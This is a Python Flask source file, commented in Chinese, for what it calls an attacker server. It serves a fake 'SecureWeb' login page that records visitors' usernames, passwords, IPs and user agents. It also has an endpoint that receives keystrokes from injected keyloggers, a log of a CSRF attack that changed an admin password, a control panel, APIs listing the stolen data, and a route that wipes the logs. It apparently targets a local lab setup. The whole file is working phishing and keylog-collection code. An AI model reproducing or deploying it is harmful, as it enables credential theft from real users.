from flask import Flask, request, render_template, redirect, url_for, session, make_response
import secrets
import requests
import sqlite3
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'evil_attacker_key'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STOLEN_DATA_FILE = os.path.join(BASE_DIR, 'stolen_credentials.txt')
KEYLOGGER_FILE = os.path.join(BASE_DIR,'stolen_keys.log')

# 確保目錄存在
os.makedirs(os.path.join(BASE_DIR, 'keylogger'), exist_ok=True)

# 記錄竊取的帳密
def log_stolen_credentials(username, password, user_agent, ip):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(STOLEN_DATA_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] IP: {ip} - Username: {username} - Password: {password} - UserAgent: {user_agent}\n")
    print(f"[STOLEN CREDS] {ip} - {username}:{password}")

# 記錄 keylogger 數據
def log_keylogger_data(keys, ip):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(KEYLOGGER_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] IP: {ip} - Keys: {keys}\n")
    print(f"[KEYLOGGER] {ip}: {keys}")

# 記錄 CSRF 攻擊成功的數據
def log_csrf_attack(target_user, old_password, new_password, ip):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    csrf_file = os.path.join(BASE_DIR, 'csrf_attacks.log')
    with open(csrf_file, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] IP: {ip} - Target: {target_user} - Old: {old_password} - New: {new_password}\n")
    print(f"[CSRF ATTACK] {ip} - {target_user} password changed from {old_password} to {new_password}")

@app.route('/')
def index():
    return redirect('/login')  # 直接使用 URL 而不是 url_for

# 偽造的登入頁面 - 看起來與真實的一樣
@app.route('/login', methods=['GET', 'POST'])
def fake_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user_agent = request.headers.get('User-Agent', 'Unknown')
        client_ip = request.remote_addr
        
        # 記錄竊取的帳密
        log_stolen_credentials(username, password, user_agent, client_ip)
        
        # 更真實的重定向 - 模擬登入成功但需要重新驗證
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>登入成功 - SecureWeb</title>
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .success-box {
                    background: white;
                    padding: 2rem;
                    border-radius: 20px;
                    text-align: center;
                    box-shadow: 0 20px 40px rgba(0,0,0,0.1);
                    max-width: 400px;
                }
                .loading { 
                    font-size: 2rem; 
                    animation: spin 1s linear infinite; 
                }
                @keyframes spin { 
                    to { transform: rotate(360deg); } 
                }
            </style>
        </head>
        <body>
            <div class="success-box">
                <div class="loading">⏳</div>
                <h2 style="color: #28a745;">登入成功！</h2>
                <p>正在進行安全驗證...</p>
                <p><small>由於安全性考量，系統需要重新驗證您的身份</small></p>
            </div>
            
            <script>
                // 模擬載入時間
                setTimeout(() => {
                    alert('驗證完成！正在跳轉到安全伺服器...');
                    window.location.href = 'http://127.0.0.1:5000/login';
                }, 3000);
            </script>
        </body>
        </html>
        '''
    
    return render_template('fake_login.html')

# 新增偽造的關於頁面
@app.route('/about')
def fake_about():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>關於我們 - SecureWeb</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 2rem;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <h1>🔒 SecureWeb</h1>
        <p>我們致力於提供最安全的網路服務</p>
        <p><small>此頁面正在維護中...</small></p>
        <a href="/login" style="color: lightblue;">返回登入</a>
    </body>
    </html>
    '''

# Keylogger 數據接收端點
@app.route('/keylogger', methods=['GET'])
def keylogger_receiver():
    keys = request.args.get('keys', '')
    admin_keys = request.args.get('admin_keys', '')
    admin_pwned = request.args.get('admin_pwned', '')
    client_ip = request.remote_addr
    
    if admin_pwned == 'success':
        # 記錄 CSRF 攻擊成功
        log_csrf_attack('admin', 'adminpass', 'hacked123', client_ip)
        return '', 200, {'Content-Type': 'image/gif'}
    
    if admin_keys:
        log_keylogger_data(f"[ADMIN] {admin_keys}", client_ip)
        return '', 200, {'Content-Type': 'image/gif'}
    
    if keys:
        log_keylogger_data(keys, client_ip)
        return '', 200, {'Content-Type': 'image/gif'}
    
    return 'Bad Request', 400

# 攻擊者控制面板
@app.route('/admin')
def admin_panel():
    return render_template('admin_panel.html')

# API 端點：獲取竊取的帳密數據
@app.route('/api/stolen_creds')
def api_stolen_creds():
    stolen_creds = []
    if os.path.exists(STOLEN_DATA_FILE):
        with open(STOLEN_DATA_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            for line in lines:
                if line.strip():
                    try:
                        # 解析日誌格式: [timestamp] IP: ip - Username: user - Password: pass - UserAgent: agent
                        parts = line.strip().split(' - ')
                        timestamp_ip = parts[0].split('] IP: ')
                        timestamp = timestamp_ip[0][1:]  # 移除開頭的 [
                        ip = timestamp_ip[1]
                        username = parts[1].replace('Username: ', '')
                        password = parts[2].replace('Password: ', '')
                        user_agent = parts[3].replace('UserAgent: ', '') if len(parts) > 3 else 'Unknown'
                        
                        stolen_creds.append({
                            'timestamp': timestamp,
                            'ip': ip,
                            'username': username,
                            'password': password,
                            'user_agent': user_agent
                        })
                    except:
                        pass
    
    return {'data': stolen_creds}

# API 端點：獲取 keylogger 數據
@app.route('/api/keylogger_data')
def api_keylogger_data():
    keylogger_data = []
    if os.path.exists(KEYLOGGER_FILE):
        with open(KEYLOGGER_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            for line in lines[-50:]:  # 只取最新的50條記錄
                if line.strip():
                    try:
                        # 解析日誌格式: [timestamp] IP: ip - Keys: keys
                        parts = line.strip().split(' - ')
                        timestamp_ip = parts[0].split('] IP: ')
                        timestamp = timestamp_ip[0][1:]  # 移除開頭的 [
                        ip = timestamp_ip[1]
                        keys = parts[1].replace('Keys: ', '')
                        
                        keylogger_data.append({
                            'timestamp': timestamp,
                            'ip': ip,
                            'keys': keys
                        })
                    except:
                        pass
    
    return {'data': keylogger_data}

# API 端點：獲取 CSRF 攻擊數據
@app.route('/api/csrf_attacks')
def api_csrf_attacks():
    csrf_attacks = []
    csrf_file = os.path.join(BASE_DIR, 'csrf_attacks.log')
    if os.path.exists(csrf_file):
        with open(csrf_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            for line in lines:
                if line.strip():
                    try:
                        # 解析日誌格式: [timestamp] IP: ip - Target: user - Old: old - New: new
                        parts = line.strip().split(' - ')
                        timestamp_ip = parts[0].split('] IP: ')
                        timestamp = timestamp_ip[0][1:]  # 移除開頭的 [
                        ip = timestamp_ip[1]
                        target = parts[1].replace('Target: ', '')
                        old_password = parts[2].replace('Old: ', '')
                        new_password = parts[3].replace('New: ', '')
                        
                        csrf_attacks.append({
                            'timestamp': timestamp,
                            'ip': ip,
                            'target': target,
                            'old_password': old_password,
                            'new_password': new_password
                        })
                    except:
                        pass
    
    return {'data': csrf_attacks}

# API 端點：獲取統計數據
@app.route('/api/stats')
def api_stats():
    # 統計竊取的帳密數量
    creds_count = 0
    if os.path.exists(STOLEN_DATA_FILE):
        with open(STOLEN_DATA_FILE, 'r', encoding='utf-8') as f:
            creds_count = len([line for line in f.readlines() if line.strip()])
    
    # 統計 keylogger 記錄數量
    keylogger_count = 0
    total_keys = 0
    if os.path.exists(KEYLOGGER_FILE):
        with open(KEYLOGGER_FILE, 'r', encoding='utf-8') as f:
            lines = [line for line in f.readlines() if line.strip()]
            keylogger_count = len(lines)
            for line in lines:
                try:
                    keys = line.split('Keys: ')[1].strip()
                    total_keys += len(keys)
                except:
                    pass
    
    # 統計 CSRF 攻擊數量
    csrf_count = 0
    csrf_file = os.path.join(BASE_DIR, 'csrf_attacks.log')
    if os.path.exists(csrf_file):
        with open(csrf_file, 'r', encoding='utf-8') as f:
            csrf_count = len([line for line in f.readlines() if line.strip()])
    
    return {
        'creds_count': creds_count,
        'keylogger_count': keylogger_count,
        'total_keys': total_keys,
        'csrf_count': csrf_count,
        'server_status': 'Online',
        'fake_login_url': 'http://127.0.0.1:8888/login',
        'keylogger_url': 'http://127.0.0.1:8888/keylogger'
    }

# 清空記錄
@app.route('/clear')
def clear_logs():
    files_to_clear = [STOLEN_DATA_FILE, KEYLOGGER_FILE, os.path.join(BASE_DIR, 'csrf_attacks.log')]
    for file_path in files_to_clear:
        if os.path.exists(file_path):
            os.remove(file_path)
    return '<h1 style="color: red;">所有記錄已清空!</h1><a href="/admin" style="color: lime;">返回控制面板</a>'

if __name__ == "__main__":
    print("🏴☠ 攻擊者伺服器啟動中...")
    print("偽造登入頁面: http://127.0.0.1:8888/login")
    print("控制面板: http://127.0.0.1:8888/admin")
    print("Keylogger 接收: http://127.0.0.1:8888/keylogger")
    app.run(host="0.0.0.0", port=8888, debug=True)
